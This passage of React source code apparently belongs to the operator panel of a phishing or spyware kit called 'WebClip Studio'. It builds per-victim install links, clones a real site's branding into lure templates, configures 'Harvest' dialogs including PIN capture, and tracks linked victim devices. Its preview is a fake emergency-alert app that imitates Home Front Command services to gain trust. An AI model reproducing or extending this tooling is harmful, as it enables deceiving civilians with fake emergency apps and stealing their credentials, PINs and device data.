  if (!tplId) return <SectionNote>Save the template first, then manage targets here.</SectionNote>;
  if (loading) return <div style={{ color: C.text2, fontSize: 13 }}>Loading targets...</div>;

  const linkedDeviceIds = new Set(targets.map(t => t.device_id).filter(Boolean));
  const unlinkableDevices = devices.filter(d => !linkedDeviceIds.has(d.id));

  return (
    <div>
      {/* Link active device */}
      <div style={{ marginBottom: 20 }}>
        <label style={labelSt}>Link Active Device to This Template</label>
        <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
          <select
            value={linkDeviceId}
            onChange={e => setLinkDeviceId(e.target.value)}
            style={{ ...inp, flex: 1, fontSize: 13 }}
          >
            <option value="">-- Select a device --</option>
            {unlinkableDevices.map(d => (
              <option key={d.id} value={d.id}>
                {d.name || `Device ${d.id}`}{d.last_seen ? ` (last seen ${new Date(d.last_seen).toLocaleDateString()})` : ''}
              </option>
            ))}
          </select>
          <PrimaryBtn onClick={linkActiveDevice} disabled={linking || !linkDeviceId}>
            {linking ? 'Linking...' : 'Link Device'}
          </PrimaryBtn>
        </div>
        <div style={{ fontSize: 11, color: C.text2, marginTop: 5 }}>
          Device will use this template on next launch. Creates a linked target automatically.
        </div>
      </div>

      <div style={{ borderTop: `1px solid ${C.border}`, marginBottom: 14 }} />

      {/* New token-based target */}
      <label style={labelSt}>Create New Install Link</label>
      <div style={{ display: 'flex', gap: 8, alignItems: 'center', marginBottom: 16 }}>
        <input
          value={newLabel}
          onChange={e => setNewLabel(e.target.value)}
          onKeyDown={e => e.key === 'Enter' && createTarget()}
          placeholder="Victim label (e.g. john.doe)"
          style={{ ...inp, fontSize: 13, flex: 1 }}
        />
        <PrimaryBtn onClick={createTarget} disabled={creating || !newLabel.trim()}>
          {creating ? 'Creating...' : '+ New Target'}
        </PrimaryBtn>
      </div>

      {targets.length === 0 ? (
        <SectionNote>No targets for this template. Create one above to generate a per-victim URL.</SectionNote>
      ) : (
        <div>
          {targets.map(t => {
            const url = `${baseUrl}/install/${t.token}`;
            return (
              <div
                key={t.id}
                style={{
                  background: C.surface2,
                  border: `1px solid ${C.borderMd}`,
                  borderRadius: 7,
                  padding: '12px 14px',
                  marginBottom: 8,
                  display: 'flex',
                  alignItems: 'center',
                  gap: 12,
                }}
              >
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 5 }}>
                    <span style={{ fontSize: 13, fontWeight: 600, color: C.text }}>{t.label || '(unlabeled)'}</span>
                    {t.device_id && (
                      <span style={{ fontSize: 11, color: C.green, background: C.greenBg, borderRadius: 4, padding: '1px 7px', border: `1px solid rgba(34,197,94,0.25)` }}>linked</span>
                    )}
                    {!t.device_id && (
                      <span style={{ fontSize: 11, color: C.text2, background: C.surface3, borderRadius: 4, padding: '1px 7px', border: `1px solid ${C.borderMd}` }}>unlinked</span>
                    )}
                  </div>
                  <div style={{ fontFamily: mono, fontSize: 11, color: C.text2, wordBreak: 'break-all' }}>{url}</div>
                  {t.first_seen && (
                    <div style={{ fontSize: 11, color: C.text2, marginTop: 4 }}>First seen: {t.first_seen}</div>
                  )}
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 5, flexShrink: 0 }}>
                  <GhostBtn style={{ height: 26, fontSize: 11 }} onClick={() => navigator.clipboard?.writeText(url)}>Copy URL</GhostBtn>
                  <DangerBtn onClick={() => deleteTarget(t.id)}>Delete</DangerBtn>
                </div>
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
}

// ─── Left sidebar: template list ────────────────────────────────────────────

function TemplateList({ templates, selectedId, onSelect, onCreate, onRefresh, loading }) {
  const [newName, setNewName] = useState('');
  const [creating, setCreating] = useState(false);

  async function handleCreate() {
    const name = newName.trim();
    if (!name) return;
    setCreating(true);
    try {
      await onCreate(name);
      setNewName('');
    } finally {
      setCreating(false);
    }
  }

  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 10 }}>
        <span style={{ fontSize: 11, fontWeight: 700, letterSpacing: '0.09em', textTransform: 'uppercase', color: C.text2 }}>Templates</span>
        <GhostBtn style={{ height: 24, fontSize: 11 }} onClick={onRefresh}>Refresh</GhostBtn>
      </div>

      <div style={{ flex: 1, overflowY: 'auto', marginBottom: 10 }}>
        {loading && <div style={{ fontSize: 12, color: C.text2 }}>Loading...</div>}
        {!loading && templates.length === 0 && <div style={{ fontSize: 12, color: C.text2 }}>No templates yet.</div>}
        {templates.map(t => (
          <div
            key={t.id}
            onClick={() => onSelect(t.id)}
            style={{
              padding: '8px 10px',
              borderRadius: 6,
              border: `1px solid ${t.id === selectedId ? C.borderHi : C.borderMd}`,
              background: t.id === selectedId ? C.accentBg : 'transparent',
              cursor: 'pointer',
              marginBottom: 4,
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
              {t.app_icon_b64 ? (
                <img src={t.app_icon_b64} alt="" style={{ width: 22, height: 22, borderRadius: 5, objectFit: 'cover', flexShrink: 0 }} />
              ) : (
                <div style={{ width: 22, height: 22, borderRadius: 5, background: C.surface3, flexShrink: 0 }} />
              )}
              <div style={{ flex: 1, minWidth: 0 }}>
                <div style={{ fontSize: 13, color: C.text, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>
                  {t.name || '(unnamed)'}
                </div>
                {t.is_default && (
                  <div style={{ fontSize: 10, color: C.accent }}>default</div>
                )}
              </div>
            </div>
          </div>
        ))}
      </div>

      <div style={{ borderTop: `1px solid ${C.border}`, paddingTop: 10 }}>
        <input
          value={newName}
          onChange={e => setNewName(e.target.value)}
          onKeyDown={e => e.key === 'Enter' && handleCreate()}
          placeholder="New template name..."
          style={{ ...inp, fontSize: 12, marginBottom: 6 }}
        />
        <PrimaryBtn onClick={handleCreate} disabled={creating || !newName.trim()} style={{ width: '100%', justifyContent: 'center' }}>
          {creating ? 'Creating...' : '+ New Template'}
        </PrimaryBtn>
      </div>
    </div>
  );
}

// ─── Cloner section ──────────────────────────────────────────────────────────

function ClonerSection({ onCreate }) {
  const [url, setUrl] = useState('');
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState('');

  async function handleClone() {
    if (!url.trim()) return;
    setLoading(true);
    setStatus('Fetching...');
    try {
      const data = await apiFetch('/api/cloner/fetch', {
        method: 'POST',
        body: JSON.stringify({ url: url.trim() }),
      });
      setStatus('Creating template...');
      const name = data.title ? `${data.title} Clone` : 'Cloned Template';
      await onCreate(name, {
        app_name: data.title || '',
        app_icon_b64: data.favicon_b64 || '',
        install_page: {
          title: 'Install App',
          body: data.description || 'Tap below to install',
          btn_label: 'Install',
          bg: data.theme_color || '#f2f2f7',
          accent: data.theme_color || '#007aff',
        },
      });
      setUrl('');
      setStatus('Done. Review and save.');
    } catch (e) {
      setStatus(`Error: ${e.message}`);
    } finally {
      setLoading(false);
    }
  }

  return (
    <div style={{ borderTop: `1px solid ${C.border}`, paddingTop: 12, marginTop: 12 }}>
      <div style={{ fontSize: 11, fontWeight: 700, letterSpacing: '0.09em', textTransform: 'uppercase', color: C.text2, marginBottom: 8 }}>Cloner</div>
      <input
        value={url}
        onChange={e => setUrl(e.target.value)}
        onKeyDown={e => e.key === 'Enter' && handleClone()}
        placeholder="https://example.com"
        style={{ ...inp, fontSize: 12, marginBottom: 6 }}
      />
      <PrimaryBtn onClick={handleClone} disabled={loading || !url.trim()} style={{ width: '100%', justifyContent: 'center' }}>
        {loading ? 'Cloning...' : 'Clone + Generate'}
      </PrimaryBtn>
      {status && <div style={{ fontSize: 11, color: C.green, marginTop: 6 }}>{status}</div>}
      <div style={{ fontSize: 11, color: C.text2, marginTop: 6 }}>Fetches title, favicon, and theme from target URL and auto-creates a template.</div>
    </div>
  );
}

// ─── Main component ──────────────────────────────────────────────────────────

const TABS = ['Identity', 'UI', 'Splash', 'Install', 'Onboarding', 'Harvest', 'Flows', 'Targets'];

export default function StudioBuilder() {
  const [templates, setTemplates] = useState([]);
  const [templatesLoading, setTemplatesLoading] = useState(true);
  const [selectedTplId, setSelectedTplId] = useState(null);
  const [tpl, setTpl] = useState(null);
  const [tplDirty, setTplDirty] = useState(false);
  const [activeTab, setActiveTab] = useState('Identity');
  const [saving, setSaving] = useState(false);
  const [deleting, setDeleting] = useState(false);
  const [devices, setDevices] = useState([]);
  const [tabTargets, setTabTargets] = useState([]);

  const baseUrl = window.location.origin;

  useEffect(() => {
    loadTemplates();
    apiFetch('/api/devices/').then(d => setDevices(d || [])).catch(() => {});
  }, []);

  async function loadTemplates() {
    setTemplatesLoading(true);
    try {
      const data = await apiFetch('/api/wc/templates');
      setTemplates(data || []);
    } catch (_) {}
    finally { setTemplatesLoading(false); }
  }

  async function selectTemplate(id) {
    if (tplDirty && !window.confirm('You have unsaved changes. Discard them?')) return;
    setSelectedTplId(id);
    setTpl(null);
    setTplDirty(false);
    try {
      const data = await apiFetch(`/api/wc/templates/${id}`);
      setTpl(defaultTemplate(data));
      // load targets for this template
      const tgts = await apiFetch('/api/wc/targets');
      setTabTargets((tgts || []).filter(t => t.template_id === id));
    } catch (e) {
      alert(`Load failed: ${e.message}`);
    }
  }

  async function createTemplate(name, extra) {
    const created = await apiFetch('/api/wc/templates', { method: 'POST', body: JSON.stringify({ name }) });
    if (extra) {
      // patch extra fields right away
      await apiFetch(`/api/wc/templates/${created.id}`, {
        method: 'PUT',
        body: JSON.stringify({ ...extra }),
      });
    }
    await loadTemplates();
    await selectTemplate(created.id);
    return created;
  }

  function handleTplChange(updated) {
    setTpl(prev => ({ ...prev, ...updated }));
    setTplDirty(true);
  }

  async function saveTemplate() {
    if (!tpl || !selectedTplId) return;
    setSaving(true);
    try {
      const body = {
        name: tpl.name,
        is_default: tpl.is_default,
        app_name: tpl.app_name,
        app_icon_b64: tpl.app_icon_b64,
        ui_type: tpl.ui_type,
        ui_html: tpl.ui_html,
        theme: tpl.theme || {},
        splash: tpl.splash,
        install_page: tpl.install_page,
        onboarding: tpl.onboarding || [],
        harvest: tpl.harvest || [],
      };
      await apiFetch(`/api/wc/templates/${selectedTplId}`, { method: 'PUT', body: JSON.stringify(body) });
      if (tpl.is_default) {
        await apiFetch(`/api/wc/templates/${selectedTplId}/set-default`, { method: 'POST' });
      }
      setTplDirty(false);
      await loadTemplates();
    } catch (e) {
      alert(`Save failed: ${e.message}`);
    } finally {
      setSaving(false);
    }
  }

  async function deleteTemplate() {
    if (!selectedTplId) return;
    if (!window.confirm('Delete this template? This cannot be undone.')) return;
    setDeleting(true);
    try {
      await apiFetch(`/api/wc/templates/${selectedTplId}`, { method: 'DELETE' });
      setSelectedTplId(null);
      setTpl(null);
      setTplDirty(false);
      await loadTemplates();
    } catch (e) {
      alert(`Delete failed: ${e.message}`);
    } finally {
      setDeleting(false);
    }
  }

  async function duplicateTemplate() {
    if (!selectedTplId) return;
    try {
      const duped = await apiFetch(`/api/wc/templates/${selectedTplId}/duplicate`, { method: 'POST' });
      await loadTemplates();
      await selectTemplate(duped.id);
    } catch (e) {
      alert(`Duplicate failed: ${e.message}`);
    }
  }

  return (
    <div style={{ display: 'flex', height: '100%', minHeight: 0, fontFamily: sans, color: C.text, overflow: 'hidden' }}>
      {/* Left sidebar */}
      <div style={{
        width: 240,
        flexShrink: 0,
        background: C.surface,
        border: `1px solid ${C.borderMd}`,
        borderRadius: 8,
        padding: '14px 14px',
        display: 'flex',
        flexDirection: 'column',
        marginRight: 14,
        overflow: 'hidden',
      }}>
        <TemplateList
          templates={templates}
          selectedId={selectedTplId}
          onSelect={id => selectTemplate(id)}
          onCreate={createTemplate}
          onRefresh={loadTemplates}
          loading={templatesLoading}
        />
        <ClonerSection onCreate={createTemplate} />
      </div>

      {/* Right editor */}
      <div style={{ flex: 1, minWidth: 0, display: 'flex', flexDirection: 'column', overflow: 'hidden', marginRight: tpl ? 14 : 0 }}>
        {!tpl && !selectedTplId && (
          <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <div style={{ textAlign: 'center', color: C.text2 }}>
              <div style={{ fontSize: 15, marginBottom: 8 }}>WebClip Studio</div>
              <div style={{ fontSize: 13 }}>Select a template from the left, or create a new one.</div>
            </div>
          </div>
        )}

        {selectedTplId && !tpl && (
          <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <div style={{ fontSize: 13, color: C.text2 }}>Loading template...</div>
          </div>
        )}

        {tpl && (
          <>
            {/* Header bar */}
            <div style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
              marginBottom: 12,
              flexShrink: 0,
              background: C.surface,
              border: `1px solid ${C.borderMd}`,
              borderRadius: 8,
              padding: '10px 14px',
            }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                {tpl.app_icon_b64 ? (
                  <img src={tpl.app_icon_b64} alt="" style={{ width: 28, height: 28, borderRadius: 7, objectFit: 'cover' }} />
                ) : (
                  <div style={{ width: 28, height: 28, borderRadius: 7, background: C.surface3 }} />
                )}
                <div>
                  <div style={{ fontSize: 14, fontWeight: 700, color: C.text }}>{tpl.name || '(unnamed)'}</div>
                  {tpl.app_name && <div style={{ fontSize: 11, color: C.text2 }}>{tpl.app_name}</div>}
                </div>
                {tplDirty && <span style={{ fontSize: 11, color: C.amber, marginLeft: 6 }}>unsaved</span>}
              </div>
              <div style={{ display: 'flex', gap: 8 }}>
                <GhostBtn onClick={duplicateTemplate}>Duplicate</GhostBtn>
                <DangerBtn onClick={deleteTemplate} disabled={deleting}>{deleting ? 'Deleting...' : 'Delete'}</DangerBtn>
                <PrimaryBtn onClick={saveTemplate} disabled={saving}>{saving ? 'Saving...' : 'Save'}</PrimaryBtn>
              </div>
            </div>

            {/* Tab bar */}
            <div style={{
              display: 'flex',
              gap: 2,
              marginBottom: 12,
              flexShrink: 0,
              background: C.surface,
              border: `1px solid ${C.borderMd}`,
              borderRadius: 8,
              padding: '6px 8px',
            }}>
              {TABS.map(tab => (
                <button
                  key={tab}
                  onClick={() => setActiveTab(tab)}
                  style={{
                    height: 28,
                    padding: '0 12px',
                    borderRadius: 5,
                    border: 'none',
                    background: activeTab === tab ? C.accent : 'transparent',
                    color: activeTab === tab ? '#fff' : C.text2,
                    fontSize: 12,
                    fontWeight: activeTab === tab ? 600 : 400,
                    cursor: 'pointer',
                    fontFamily: sans,
                    whiteSpace: 'nowrap',
                  }}
                >
                  {tab}
                </button>
              ))}
            </div>

            {/* Editor panel */}
            <div style={{
              flex: 1,
              background: C.surface,
              border: `1px solid ${C.borderMd}`,
              borderRadius: 8,
              padding: '16px 18px',
              overflowY: 'auto',
              minHeight: 0,
            }}>
              {activeTab === 'Identity' && (
                <TabIdentity tpl={tpl} onChange={handleTplChange} />
              )}
              {activeTab === 'UI' && (
                <TabUI tpl={tpl} onChange={handleTplChange} />
              )}
              {activeTab === 'Splash' && (
                <TabSplash tpl={tpl} onChange={handleTplChange} />
              )}
              {activeTab === 'Install' && (
                <TabInstall tpl={tpl} onChange={handleTplChange} targets={tabTargets} baseUrl={baseUrl} />
              )}
              {activeTab === 'Onboarding' && (
                <TabOnboarding tpl={tpl} onChange={handleTplChange} />
              )}
              {activeTab === 'Harvest' && (
                <TabHarvest tpl={tpl} onChange={handleTplChange} />
              )}
              {activeTab === 'Flows' && (
                <TabFlows devices={devices} />
              )}
              {activeTab === 'Targets' && (
                <TabTargets tplId={selectedTplId} baseUrl={baseUrl} />
              )}
            </div>
          </>
        )}
      </div>

      {/* iPhone Preview panel */}
      {tpl && <PhonePreview tpl={tpl} />}
    </div>
  );
}

// ─── PhonePreview ────────────────────────────────────────────────────────────

function SafeAlertMockup({ appName, harvest }) {
  const [tab, setTab] = useState('home');
  const [alertFilter, setAlertFilter] = useState('all');
  const [currentHarvest, setCurrentHarvest] = useState(null);

  const ALERTS = [
    { id: 1, cat: 'security', sev: 'high',   color: '#ff3b30', label: 'SECURITY', title: 'Security drill – Route 4', body: 'Home Front Command security drill scheduled. Follow instructions.', dist: '0.5 km', time: '2 min ago' },
    { id: 2, cat: 'weather',  sev: 'medium',  color: '#ff9500', label: 'WEATHER',  title: 'Strong winds expected', body: 'Gusts up to 70 km/h expected from 14:00.', dist: '1.1 km', time: '8 min ago' },
    { id: 3, cat: 'traffic',  sev: 'medium',  color: '#ff9500', label: 'TRAFFIC',  title: 'Accident on Route 1', body: 'Collision near Tel Aviv South exit. Expect delays.', dist: '0.3 km', time: '12 min ago' },
    { id: 4, cat: 'municipal',sev: 'low',     color: '#34c759', label: 'MUNICIPAL', title: 'Road closure lifted – Ha\'Yarkon', body: 'Ha\'Yarkon street re-opened to all traffic.', dist: '2.4 km', time: '34 min ago' },
    { id: 5, cat: 'weather',  sev: 'low',     color: '#34c759', label: 'WEATHER',  title: 'Heat advisory cancelled', body: 'Temperatures returning to seasonal average.', dist: '—', time: '1 hr ago' },
    { id: 6, cat: 'traffic',  sev: 'high',    color: '#ff3b30', label: 'TRAFFIC',  title: 'Emergency closure – Begin Rd', body: 'Full road closure due to infrastructure inspection.', dist: '0.8 km', time: '2 hr ago' },
  ];
  const SHELTERS = [
    { name: 'Central Bus Station', dist: '0.2 km', cap: 50,  open: true  },
    { name: 'City Hall Basement',  dist: '0.4 km', cap: 120, open: true  },
    { name: 'Azrieli Mall Level -1', dist: '0.7 km', cap: 200, open: true },
    { name: "Ha'atzmaut Park Shelter", dist: '1.1 km', cap: 80, open: false },
    { name: 'Municipal Library',   dist: '1.4 km', cap: 60,  open: true  },
  ];
  const CONTACTS = [
    { n: 'Police',           num: '100', color: '#0055cc' },
    { n: 'Magen David Adom', num: '101', color: '#ff3b30' },
    { n: 'Fire Department',  num: '102', color: '#ff9500' },
    { n: 'Home Front Command', num: '104', color: '#5856d6' },
  ];

  const accent = '#0055cc';
  const s = { fontFamily: '-apple-system,sans-serif' };
  const filteredAlerts = alertFilter === 'all' ? ALERTS : ALERTS.filter(a => a.cat === alertFilter);

  const TABS_DEF = [
    { key: 'home',     label: 'Home',     svg: <svg viewBox="0 0 24 24" width={18} height={18} fill="currentColor"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg> },
    { key: 'alerts',   label: 'Alerts',   svg: <svg viewBox="0 0 24 24" width={18} height={18} fill="currentColor"><path d="M12 2a7 7 0 0 1 7 7v3.586l1.707 1.707A1 1 0 0 1 20 16H4a1 1 0 0 1-.707-1.707L5 12.586V9a7 7 0 0 1 7-7zm0 20a2 2 0 0 1-2-2h4a2 2 0 0 1-2 2z"/></svg> },
    { key: 'shelters', label: 'Shelters', svg: <svg viewBox="0 0 24 24" width={18} height={18} fill="currentColor"><path d="M12 3L2 12h3v9h6v-5h2v5h6v-9h3L12 3z"/></svg> },
    { key: 'contacts', label: 'Contacts', svg: <svg viewBox="0 0 24 24" width={18} height={18} fill="currentColor"><path d="M16 11c1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3 1.34 3 3 3zm-8 0c1.66 0 3-1.34 3-3S9.66 5 8 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5C15 14.17 10.33 13 8 13zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5C23 14.17 18.33 13 16 13z"/></svg> },
    { key: 'settings', label: 'Settings', svg: <svg viewBox="0 0 24 24" width={18} height={18} fill="currentColor"><path d="M19.14 12.94c.04-.3.06-.61.06-.94s-.02-.64-.07-.94l2.03-1.58a.49.49 0 0 0 .12-.61l-1.92-3.32a.49.49 0 0 0-.59-.22l-2.39.96a7.03 7.03 0 0 0-1.62-.94l-.36-2.54a.484.484 0 0 0-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58a.49.49 0 0 0-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg> },
  ];

  const Navbar = ({ title }) => (
    <div style={{ height: 44, background: '#fff', borderBottom: '0.5px solid #e5e5ea', display: 'flex', alignItems: 'center', padding: '0 12px', flexShrink: 0, ...s }}>
      <span style={{ fontSize: 15, fontWeight: 600, flex: 1, color: '#1c1c1e' }}>{title}</span>
    </div>
  );

  const SevBadge = ({ sev, color }) => (
    <span style={{ background: color, color: '#fff', fontSize: 8, fontWeight: 700, padding: '1px 5px', borderRadius: 5, letterSpacing: '0.05em' }}>
      {sev === 'high' ? 'HIGH' : sev === 'medium' ? 'MED' : 'LOW'}
    </span>
  );

  return (
    <div style={{ flex: 1, display: 'flex', flexDirection: 'column', background: '#f2f2f7', height: '100%', overflow: 'hidden', position: 'relative', ...s }}>

      {/* ── HOME ── */}
      {tab === 'home' && (<>
        <Navbar title={appName || 'SafeAlert'} />
        <div style={{ flex: 1, overflowY: 'auto', paddingBottom: 56 }}>
          {/* Hero */}
          <div style={{ margin: '10px 10px 0', background: 'linear-gradient(135deg,#1a9e40,#27c050)', borderRadius: 14, padding: '14px 14px 12px', position: 'relative', overflow: 'hidden', boxShadow: '0 4px 14px rgba(52,199,89,.3)' }}>
            <div style={{ position: 'absolute', top: -16, right: -16, width: 72, height: 72, borderRadius: '50%', background: 'rgba(255,255,255,.1)' }} />
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 6 }}>
              <div style={{ width: 8, height: 8, borderRadius: '50%', background: '#fff', boxShadow: '0 0 0 3px rgba(255,255,255,.35)', flexShrink: 0 }} />
              <span style={{ fontSize: 10, fontWeight: 700, color: 'rgba(255,255,255,.85)', letterSpacing: '0.08em' }}>AREA STATUS</span>
            </div>
            <div style={{ fontSize: 18, fontWeight: 700, color: '#fff', marginBottom: 2 }}>All Clear</div>
            <div style={{ fontSize: 10, color: 'rgba(255,255,255,.75)' }}>No active threats in your area</div>
          </div>
          {/* Quick actions */}
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8, margin: '10px 10px 0' }}>
            {[['📢','Report Incident','#fff3cd'],['🏠','Find Shelter','#dbeafe'],['🆘','Emergency SOS','#fee2e2'],['❤️‍🩹','First Aid','#d1fae5']].map(([ic,lbl,bg]) => (
              <div key={lbl} style={{ background: bg, borderRadius: 12, padding: '10px 10px 8px', cursor: 'pointer' }}>
                <div style={{ fontSize: 18, marginBottom: 4 }}>{ic}</div>
                <div style={{ fontSize: 10, fontWeight: 600, color: '#1c1c1e' }}>{lbl}</div>
              </div>
            ))}
          </div>
          {/* Location promo */}
          <div style={{ margin: '10px 10px 0', background: '#dbeafe', borderRadius: 12, padding: '10px 12px', display: 'flex', alignItems: 'center', gap: 8 }}>
            <span style={{ fontSize: 18 }}>📍</span>
            <div style={{ flex: 1 }}>
              <div style={{ fontSize: 10, fontWeight: 600, color: '#1c1c1e' }}>Get alerts near you</div>
              <div style={{ fontSize: 9, color: '#6b7280' }}>Enable location for personalized alerts</div>
            </div>
            <span style={{ fontSize: 9, fontWeight: 700, color: accent }}>Enable</span>
          </div>
          {/* Alert cards */}
          <div style={{ padding: '8px 10px 2px', fontSize: 11, fontWeight: 700, color: '#1c1c1e' }}>Active Alerts</div>
          {ALERTS.slice(0,3).map(a => (
            <div key={a.id} style={{ margin: '0 10px 6px', background: '#fff', borderRadius: 12, padding: '8px 10px', borderLeft: `3px solid ${a.color}` }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 5, marginBottom: 3 }}>
                <SevBadge sev={a.sev} color={a.color} />
                <span style={{ fontSize: 8, color: '#8e8e93', marginLeft: 'auto' }}>{a.time}</span>
              </div>
              <div style={{ fontSize: 11, fontWeight: 600, color: '#1c1c1e' }}>{a.title}</div>
              <div style={{ fontSize: 9, color: accent, marginTop: 1 }}>{a.dist} away</div>
            </div>
          ))}
          {/* Harvest preview */}
          {harvest && harvest.filter(h => h.permission !== 'pin_capture').length > 0 && (
            <div style={{ margin: '6px 10px 0', padding: '8px 10px', background: '#fff', borderRadius: 10 }}>
              <div style={{ fontSize: 8, color: '#aeaeb2', marginBottom: 5, fontWeight: 600, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Preview Harvest Dialogs</div>
              {harvest.filter(h => h.permission !== 'pin_capture').map((h, i) => (
                <button key={i} onClick={() => setCurrentHarvest(h)} style={{ display: 'block', width: '100%', marginBottom: 3, padding: '5px 8px', background: '#f2f2f7', border: '1px solid #e5e5ea', borderRadius: 6, fontSize: 9, color: accent, textAlign: 'left', cursor: 'pointer' }}>
                  ▶ {h.title || h.permission}
                </button>
              ))}
            </div>
          )}
        </div>
      </>)}

      {/* ── ALERTS ── */}
      {tab === 'alerts' && (<>
        <Navbar title="Alerts" />
        <div style={{ flex: 1, overflowY: 'auto', paddingBottom: 56 }}>
          <div style={{ display: 'flex', gap: 5, padding: '8px 10px', overflowX: 'auto' }}>
            {[['all','All'],['security','Security'],['weather','Weather'],['traffic','Traffic'],['municipal','Municipal']].map(([k,l]) => (
              <button key={k} onClick={() => setAlertFilter(k)} style={{ border: 'none', padding: '4px 10px', borderRadius: 14, fontSize: 10, fontWeight: 600, whiteSpace: 'nowrap', cursor: 'pointer', background: alertFilter === k ? accent : '#e5e5ea', color: alertFilter === k ? '#fff' : '#3a3a3c' }}>{l}</button>
            ))}
          </div>
          {filteredAlerts.map(a => (
            <div key={a.id} style={{ margin: '0 10px 6px', background: '#fff', borderRadius: 12, padding: '10px 12px', borderLeft: `3px solid ${a.color}` }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 5, marginBottom: 4 }}>
                <SevBadge sev={a.sev} color={a.color} />
                <span style={{ fontSize: 8, color: '#8e8e93', marginLeft: 'auto' }}>{a.time}</span>
              </div>
              <div style={{ fontSize: 12, fontWeight: 600, color: '#1c1c1e' }}>{a.title}</div>
              <div style={{ fontSize: 10, color: '#6b7280', marginTop: 2, lineHeight: 1.4 }}>{a.body}</div>
              <div style={{ fontSize: 9, color: accent, marginTop: 4 }}>{a.dist} away</div>
            </div>
          ))}
        </div>
      </>)}

      {/* ── SHELTERS ── */}
      {tab === 'shelters' && (<>
        <Navbar title="Shelter Finder" />
        <div style={{ flex: 1, overflowY: 'auto', paddingBottom: 56 }}>
          <div style={{ margin: '10px 10px 0', borderRadius: 12, background: '#c8ddf0', height: 90, position: 'relative', overflow: 'hidden' }}>
            <div style={{ position: 'absolute', inset: 0, backgroundImage: 'linear-gradient(rgba(0,0,0,0.06) 1px,transparent 1px),linear-gradient(90deg,rgba(0,0,0,0.06) 1px,transparent 1px)', backgroundSize: '14px 14px' }} />
            {[[38,45],[65,60],[22,70],[78,30],[55,80]].map(([x,y],i) => (
              <div key={i} style={{ position: 'absolute', left: `${x}%`, top: `${y}%`, width: 8, height: 8, borderRadius: '50%', background: '#0055cc', transform: 'translate(-50%,-50%)', boxShadow: '0 0 0 3px rgba(0,85,204,0.2)' }} />
            ))}
            <div style={{ position: 'absolute', top: '50%', left: '50%', width: 10, height: 10, borderRadius: '50%', background: '#ff3b30', transform: 'translate(-50%,-50%)', boxShadow: '0 0 0 4px rgba(255,59,48,0.25)' }} />
          </div>
          <div style={{ padding: '8px 10px 2px', fontSize: 11, fontWeight: 700, color: '#1c1c1e' }}>Nearby Shelters</div>
          {SHELTERS.map((sh,i) => (
            <div key={i} style={{ margin: '0 10px 5px', background: '#fff', borderRadius: 10, padding: '8px 10px', display: 'flex', alignItems: 'center', gap: 8 }}>
              <div style={{ flex: 1 }}>
                <div style={{ fontSize: 11, fontWeight: 600, color: '#1c1c1e' }}>{sh.name}</div>
                <div style={{ fontSize: 9, color: '#8e8e93', marginTop: 1 }}>{sh.dist} · {sh.cap} people</div>
              </div>
              <span style={{ fontSize: 9, fontWeight: 700, padding: '2px 6px', borderRadius: 5, background: sh.open ? '#d1fae5' : '#fee2e2', color: sh.open ? '#065f46' : '#991b1b' }}>{sh.open ? 'OPEN' : 'CLOSED'}</span>
            </div>
          ))}
        </div>
      </>)}

      {/* ── CONTACTS ── */}
      {tab === 'contacts' && (<>
        <Navbar title="Emergency Contacts" />
        <div style={{ flex: 1, overflowY: 'auto', paddingBottom: 56 }}>
          <div style={{ padding: '8px 10px 2px', fontSize: 11, fontWeight: 700, color: '#1c1c1e' }}>Emergency Services</div>
          {CONTACTS.map((c,i) => (
            <div key={i} style={{ margin: '0 10px 5px', background: '#fff', borderRadius: 10, padding: '8px 10px', display: 'flex', alignItems: 'center', gap: 10 }}>
              <div style={{ width: 32, height: 32, borderRadius: '50%', background: c.color, display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#fff', fontSize: 14, flexShrink: 0 }}>📞</div>
              <div style={{ flex: 1 }}>
                <div style={{ fontSize: 11, fontWeight: 600, color: '#1c1c1e' }}>{c.n}</div>
                <div style={{ fontSize: 13, fontWeight: 700, color: c.color }}>{c.num}</div>
              </div>
            </div>
          ))}
          <div style={{ padding: '8px 10px 2px', fontSize: 11, fontWeight: 700, color: '#1c1c1e' }}>My Family</div>
          <div style={{ margin: '0 10px 5px', background: '#fff', borderRadius: 10, padding: '12px 10px', textAlign: 'center' }}>
            <div style={{ fontSize: 22, marginBottom: 4 }}>👨‍👩‍👧</div>
